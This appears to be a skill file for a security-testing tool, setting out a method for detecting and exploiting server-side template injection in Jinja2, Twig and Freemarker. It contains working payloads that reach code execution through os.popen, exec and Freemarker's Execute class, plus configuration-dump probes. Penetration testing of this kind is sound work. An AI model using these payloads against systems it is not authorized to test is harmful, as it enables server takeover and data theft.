---
name: ssti_testing
description: Server-Side Template Injection testing
category: injection
bug_class: ssti
triggers:
  - ssti
  - template injection
  - server-side template
  - jinja
  - twig
  - freemarker
  - velocity
---

# Server-Side Template Injection (SSTI) Testing

## Key Insight
SSTI occurs when user input is embedded directly into a template engine's template, allowing an attacker to inject template directives that execute on the server.

## Attack Surface
- Any input that appears reflected in the response
- Search fields, form inputs, URL parameters
- HTTP headers (User-Agent, Referer, X-Forwarded-For)
- File upload names
- Error pages that display user input

## Methodology
1. **Detection**: Inject template syntax and check for evaluation
2. **Identification**: Determine which template engine is in use
3. **Exploitation**: Craft payloads for the specific engine
4. **Validation**: Confirm code execution with safe payloads

## Detection Payloads
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
{{config}}
```

## Engine-Specific Payloads

### Jinja2 (Python/Flask)
```
{{config}}
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Twig (PHP/Symfony)
```
{{7*7}}
{{_self.env.registerUndefinedFilterCallback('exec')}}
{{_self.env.getFilter('id')}}
```

### Freemarker (Java)
```
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
```

## Validation
- `{{7*7}}` should return `49`
- `{{config}}` should dump configuration
- Check for error messages revealing template engine

## False Positive Avoidance
- If `{{7*7}}` returns `{{7*7}}` literally, template is not vulnerable
- HTML encoding of `{{` and `}}` means input is sanitized
- JSON APIs returning `{{7*7}}` as data are not vulnerable
